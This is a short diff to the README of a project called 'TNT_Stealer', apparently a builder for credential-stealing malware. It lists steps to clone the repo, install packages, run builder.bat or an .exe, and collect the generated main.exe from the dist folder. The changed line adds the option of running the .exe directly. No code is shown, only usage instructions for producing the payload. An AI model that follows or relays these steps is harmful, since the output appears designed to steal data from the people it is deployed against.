@@ -62,7 +62,7 @@ TNT_Stealer
 1. Clone This repo
 2. Extract zip
 3. First install reqiured packages by double clicking `install.bat` file
-4. Run the builder by double clicking the `builder.bat` file
+4. Run the builder by double clicking the `builder.bat` file or by executing the .exe file
 5. Follow instructions in builder and your exe will be found in the `dist` folder under the name `main.exe`
 
 
